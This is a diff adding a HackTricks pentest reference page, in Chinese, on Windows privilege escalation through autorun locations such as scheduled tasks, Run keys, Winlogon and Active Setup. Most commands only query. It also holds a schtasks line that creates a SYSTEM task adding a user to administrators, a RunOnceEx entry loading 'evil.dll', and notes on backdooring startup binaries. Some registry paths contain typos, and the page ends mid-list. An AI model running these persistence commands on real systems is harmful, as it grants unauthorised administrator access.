@@ -1,0 +1,508 @@
+<!DOCTYPE HTML>
+<html lang="zh" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Privilege Escalation with Autoruns</title>
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../../favicon.svg">
+        <link rel="shortcut icon" href="../../favicon.png">
+        <link rel="stylesheet" href="../../css/variables.css">
+        <link rel="stylesheet" href="../../css/general.css">
+        <link rel="stylesheet" href="../../css/chrome.css">
+        <link rel="stylesheet" href="../../css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../../highlight.css">
+        <link rel="stylesheet" href="../../tomorrow-night.css">
+        <link rel="stylesheet" href="../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "../../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../../toc.js"></script>
+    </head>
+    <body>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="../../toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title"></h1>
+
+                    <div class="right-buttons">
+                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="privilege-escalation-with-autoruns"><a class="header" href="#privilege-escalation-with-autoruns">Privilege Escalation with Autoruns</a></h1>
+<p>{% hint style="success" %}
+Learn &amp; practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
+Learn &amp; practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>Support HackTricks</summary>
+<ul>
+<li>Check the <a href="https://github.com/sponsors/carlospolop"><strong>subscription plans</strong></a>!</li>
+<li><strong>Join the</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord group</strong></a> or the <a href="https://t.me/peass"><strong>telegram group</strong></a> or <strong>follow</strong> us on <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>Share hacking tricks by submitting PRs to the</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> and <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github repos.</li>
+</ul>
+</details>
+{% endhint %}
+<figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>
+<p><strong>Bug bounty tip</strong>: <strong>sign up</strong> for <strong>Intigriti</strong>, a premium <strong>bug bounty platform created by hackers, for hackers</strong>! Join us at <a href="https://go.intigriti.com/hacktricks"><strong>https://go.intigriti.com/hacktricks</strong></a> today, and start earning bounties up to <strong>$100,000</strong>!</p>
+<p>{% embed url="https://go.intigriti.com/hacktricks" %}</p>
+<h2 id="wmic"><a class="header" href="#wmic">WMIC</a></h2>
+<p><strong>Wmic</strong> 可以用来在 <strong>启动时</strong> 运行程序。查看哪些二进制文件被编程为在启动时运行：</p>
+<pre><code class="language-bash">wmic startup get caption,command 2&gt;nul &amp; ^
+Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
+</code></pre>
+<h2 id="定时任务"><a class="header" href="#定时任务">定时任务</a></h2>
+<p><strong>任务</strong>可以按<strong>特定频率</strong>安排运行。查看哪些二进制文件被安排运行：</p>
+<pre><code class="language-bash">schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
+schtasks /query /fo LIST 2&gt;nul | findstr TaskName
+schtasks /query /fo LIST /v &gt; schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
+Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
+
+#Schtask to give admin access
+#You can also write that content on a bat file that is being executed by a scheduled task
+schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
+</code></pre>
+<h2 id="folders"><a class="header" href="#folders">Folders</a></h2>
+<p>所有位于 <strong>启动文件夹中的二进制文件将在启动时执行</strong>。常见的启动文件夹如下所列，但启动文件夹在注册表中指示。<a href="privilege-escalation-with-autorun-binaries.html#startup-path">阅读此以了解在哪里。</a></p>
+<pre><code class="language-bash">dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2&gt;nul
+dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2&gt;nul
+dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2&gt;nul
+dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2&gt;nul
+Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
+Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
+</code></pre>
+<h2 id="注册表"><a class="header" href="#注册表">注册表</a></h2>
+<p>{% hint style="info" %}
+<a href="https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f">此处的说明</a>：<strong>Wow6432Node</strong> 注册表项表示您正在运行 64 位 Windows 版本。操作系统使用此键为在 64 位 Windows 版本上运行的 32 位应用程序显示 HKEY_LOCAL_MACHINE\SOFTWARE 的单独视图。
+{% endhint %}</p>
+<h3 id="运行"><a class="header" href="#运行">运行</a></h3>
+<p><strong>常见的</strong> AutoRun 注册表：</p>
+<ul>
+<li><code>HKLM\Software\Microsoft\Windows\CurrentVersion\Run</code></li>
+<li><code>HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce</code></li>
+<li><code>HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run</code></li>
+<li><code>HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce</code></li>
+<li><code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code></li>
+<li><code>HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce</code></li>
+<li><code>HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run</code></li>
+<li><code>HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce</code></li>
+<li><code>HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run</code></li>
+<li><code>HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce</code></li>
+<li><code>HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx</code></li>
+</ul>
+<p>被称为 <strong>Run</strong> 和 <strong>RunOnce</strong> 的注册表项旨在每次用户登录系统时自动执行程序。分配为键的数据值的命令行限制为 260 个字符或更少。</p>
+<p><strong>服务运行</strong>（可以控制启动时服务的自动启动）：</p>
+<ul>
+<li><code>HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code></li>
+<li><code>HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce</code></li>
+<li><code>HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices</code></li>
+<li><code>HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices</code></li>
+<li><code>HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce</code></li>
+<li><code>HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce</code></li>
+<li><code>HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices</code></li>
+<li><code>HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices</code></li>
+</ul>
+<p><strong>RunOnceEx：</strong></p>
+<ul>
+<li><code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx</code></li>
+<li><code>HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx</code></li>
+</ul>
+<p>在 Windows Vista 及更高版本中，<strong>Run</strong> 和 <strong>RunOnce</strong> 注册表项不会自动生成。这些键中的条目可以直接启动程序或将其指定为依赖项。例如，要在登录时加载 DLL 文件，可以使用 <strong>RunOnceEx</strong> 注册表项以及一个 "Depend" 键。这通过添加一个注册表项来演示在系统启动时执行 "C:\temp\evil.dll"：</p>
+<pre><code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
+</code></pre>
+<p>{% hint style="info" %}
+<strong>利用 1</strong>：如果您可以在 <strong>HKLM</strong> 中的任何提到的注册表项内写入，则可以在不同用户登录时提升权限。
+{% endhint %}</p>
+<p>{% hint style="info" %}
+<strong>利用 2</strong>：如果您可以覆盖 <strong>HKLM</strong> 中任何注册表项上指示的任何二进制文件，则可以在不同用户登录时用后门修改该二进制文件并提升权限。
+{% endhint %}</p>
+<pre><code class="language-bash">#CMD
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
+reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
+reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
+reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
+reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
+reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE
+
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
+reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
+reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
+reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
+reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices
+
+reg query HKLM\Software\Microsoft\Windows\RunOnceEx
+reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
+reg query HKCU\Software\Microsoft\Windows\RunOnceEx
+reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
+
+#PowerShell
+Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
+Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
+Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
+Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
+Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
+Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
+Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
+Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
+Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
+Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
+Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'
+
+Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
+Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
+Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
+Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
+Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
+Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
+Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
+Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
+
+Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
+Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
+Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
+Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
+</code></pre>
+<h3 id="启动路径"><a class="header" href="#启动路径">启动路径</a></h3>
+<ul>
+<li><code>HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code></li>
+<li><code>HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code></li>
+<li><code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders</code></li>
+<li><code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders</code></li>
+</ul>
+<p>放置在<strong>启动</strong>文件夹中的快捷方式将在用户登录或系统重启时自动触发服务或应用程序启动。<strong>启动</strong>文件夹的位置在注册表中为<strong>本地计算机</strong>和<strong>当前用户</strong>范围定义。这意味着添加到这些指定<strong>启动</strong>位置的任何快捷方式都将确保链接的服务或程序在登录或重启过程后启动，使其成为调度程序自动运行的简单方法。</p>
+<p>{% hint style="info" %}
+如果您可以覆盖<strong>HKLM</strong>下的任何[User] Shell Folder，您将能够将其指向您控制的文件夹，并放置一个后门，该后门将在用户登录系统时执行，从而提升权限。
+{% endhint %}</p>
+<pre><code class="language-bash">reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
+reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
+reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
+reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
+
+Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
+Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
+Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
+Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
+</code></pre>
+<h3 id="winlogon-键"><a class="header" href="#winlogon-键">Winlogon 键</a></h3>
+<p><code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon</code></p>
+<p>通常，<strong>Userinit</strong> 键设置为 <strong>userinit.exe</strong>。然而，如果此键被修改，指定的可执行文件将在用户登录时由 <strong>Winlogon</strong> 启动。同样，<strong>Shell</strong> 键旨在指向 <strong>explorer.exe</strong>，这是 Windows 的默认外壳。</p>
+<pre><code class="language-bash">reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
+Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
+Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
+</code></pre>
+<p>{% hint style="info" %}
+如果您可以覆盖注册表值或二进制文件，您将能够提升权限。
+{% endhint %}</p>
+<h3 id="策略设置"><a class="header" href="#策略设置">策略设置</a></h3>
+<ul>
+<li><code>HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer</code></li>
+<li><code>HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer</code></li>
+</ul>
+<p>检查 <strong>Run</strong> 键。</p>
+<pre><code class="language-bash">reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
+reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
+Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
+Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
+</code></pre>
+<h3 id="alternateshell"><a class="header" href="#alternateshell">AlternateShell</a></h3>
+<h3 id="更改安全模式命令提示符"><a class="header" href="#更改安全模式命令提示符">更改安全模式命令提示符</a></h3>
+<p>在 Windows 注册表的 <code>HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot</code> 下，默认设置有一个 <strong><code>AlternateShell</code></strong> 值为 <code>cmd.exe</code>。这意味着当你在启动时选择“带命令提示符的安全模式”（通过按 F8），将使用 <code>cmd.exe</code>。但是，可以设置计算机在不需要按 F8 和手动选择的情况下自动以此模式启动。</p>
+<p>创建自动在“带命令提示符的安全模式”中启动的启动选项的步骤：</p>
+<ol>
+<li>更改 <code>boot.ini</code> 文件的属性以移除只读、系统和隐藏标志： <code>attrib c:\boot.ini -r -s -h</code></li>
+<li>打开 <code>boot.ini</code> 进行编辑。</li>
+<li>插入一行，如： <code>multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)</code></li>
+<li>保存对 <code>boot.ini</code> 的更改。</li>
+<li>重新应用原始文件属性： <code>attrib c:\boot.ini +r +s +h</code></li>
+</ol>
+<ul>
+<li><strong>Exploit 1:</strong> 更改 <strong>AlternateShell</strong> 注册表键允许自定义命令 shell 设置，可能用于未经授权的访问。</li>
+<li><strong>Exploit 2 (PATH 写权限):</strong> 对系统 <strong>PATH</strong> 变量的任何部分具有写权限，特别是在 <code>C:\Windows\system32</code> 之前，可以执行自定义的 <code>cmd.exe</code>，如果系统在安全模式下启动，这可能是一个后门。</li>
+<li><strong>Exploit 3 (PATH 和 boot.ini 写权限):</strong> 对 <code>boot.ini</code> 的写访问权限使得自动安全模式启动成为可能，从而在下次重启时促进未经授权的访问。</li>
+</ul>
+<p>要检查当前的 <strong>AlternateShell</strong> 设置，请使用以下命令：</p>
+<pre><code class="language-bash">reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
+Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
+</code></pre>
+<h3 id="已安装组件"><a class="header" href="#已安装组件">已安装组件</a></h3>
+<p>Active Setup 是 Windows 中的一个功能，它<strong>在桌面环境完全加载之前启动</strong>。它优先执行某些命令，这些命令必须在用户登录之前完成。这个过程甚至在其他启动项（如 Run 或 RunOnce 注册表部分）被触发之前就会发生。</p>
+<p>Active Setup 通过以下注册表键进行管理：</p>
+<ul>
+<li><code>HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components</code></li>
+<li><code>HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components</code></li>
+<li><code>HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components</code></li>
+<li><code>HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components</code></li>
+</ul>
+<p>在这些键中，存在各种子键，每个子键对应一个特定组件。特别关注的键值包括：</p>
+<ul>
+<li><strong>IsInstalled:</strong></li>
+<li><code>0</code> 表示该组件的命令将不会执行。</li>
+<li><code>1</code> 表示命令将为每个用户执行一次，如果缺少 <code>IsInstalled</code> 值，则这是默认行为。</li>
+<li><strong>StubPath:</strong> 定义 Active Setup 要执行的命令。它可以是任何有效的命令行，例如启动 <code>notepad</code>。</li>
+</ul>
+<p><strong>安全洞察：</strong></p>
+<ul>
+<li>修改或写入 <strong><code>IsInstalled</code></strong> 设置为 <code>"1"</code> 的键，并指定 <strong><code>StubPath</code></strong> 可能导致未经授权的命令执行，从而可能导致权限提升。</li>
+<li>更改任何 <strong><code>StubPath</code></strong> 值中引用的二进制文件也可能实现权限提升，前提是具有足够的权限。</li>
+</ul>
+<p>要检查 Active Setup 组件中的 <strong><code>StubPath</code></strong> 配置，可以使用以下命令：</p>
+<pre><code class="language-bash">reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
+reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
+reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
+reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
+</code></pre>
+<h3 id="浏览器助手对象"><a class="header" href="#浏览器助手对象">浏览器助手对象</a></h3>
+<h3 id="浏览器助手对象-bho-概述"><a class="header" href="#浏览器助手对象-bho-概述">浏览器助手对象 (BHO) 概述</a></h3>
+<p>浏览器助手对象 (BHO) 是 DLL 模块，为微软的 Internet Explorer 添加额外功能。它们在每次启动时加载到 Internet Explorer 和 Windows Explorer 中。然而，通过将 <strong>NoExplorer</strong> 键设置为 1，可以阻止它们的执行，从而防止它们与 Windows Explorer 实例一起加载。</p>
+<p>BHO 通过 Internet Explorer 11 与 Windows 10 兼容，但在较新版本的 Windows 中的默认浏览器 Microsoft Edge 中不受支持。</p>
+<p>要探索系统上注册的 BHO，可以检查以下注册表键：</p>
+<ul>
+<li><code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects</code></li>
+<li><code>HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects</code></li>
+</ul>
+<p>每个 BHO 在注册表中由其 <strong>CLSID</strong> 表示，作为唯一标识符。有关每个 CLSID 的详细信息可以在 <code>HKLM\SOFTWARE\Classes\CLSID\{&lt;CLSID&gt;}</code> 下找到。</p>
+<p>要在注册表中查询 BHO，可以使用以下命令：</p>
+<pre><code class="language-bash">reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
+reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
+</code></pre>
+<h3 id="internet-explorer-扩展"><a class="header" href="#internet-explorer-扩展">Internet Explorer 扩展</a></h3>
+<ul>
+<li><code>HKLM\Software\Microsoft\Internet Explorer\Extensions</code></li>
+<li><code>HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions</code></li>
+</ul>
+<p>注意，注册表将为每个 dll 包含 1 个新的注册表项，并由 <strong>CLSID</strong> 表示。您可以在 <code>HKLM\SOFTWARE\Classes\CLSID\{&lt;CLSID&gt;}</code> 中找到 CLSID 信息。</p>
+<h3 id="字体驱动程序"><a class="header" href="#字体驱动程序">字体驱动程序</a></h3>
+<ul>
+<li><code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers</code></li>
+<li><code>HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers</code></li>
+</ul>
+<pre><code class="language-bash">reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
+reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
+Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
+Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
+</code></pre>
+<h3 id="打开命令"><a class="header" href="#打开命令">打开命令</a></h3>
+<ul>
+<li><code>HKLM\SOFTWARE\Classes\htmlfile\shell\open\command</code></li>
